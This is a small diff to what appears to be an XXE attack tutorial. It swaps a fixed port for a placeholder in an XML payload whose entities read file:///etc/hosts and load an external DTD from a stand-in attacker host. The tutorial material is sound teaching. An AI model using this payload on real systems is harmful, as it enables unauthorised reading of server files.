@@ -30,7 +30,7 @@ Now we can reference our external entity and print the `&joined` entity we defin
   <!ENTITY % begin "<![CDATA[">
   <!ENTITY % file SYSTEM "file:///etc/hosts">
   <!ENTITY % end "]]>">
-  <!ENTITY % xxe SYSTEM "http://OUR_IP:8080/xxe.dtd">
+  <!ENTITY % xxe SYSTEM "http://OUR_IP:OUR_PORT/xxe.dtd">
   %xxe;
 ]>
 ...
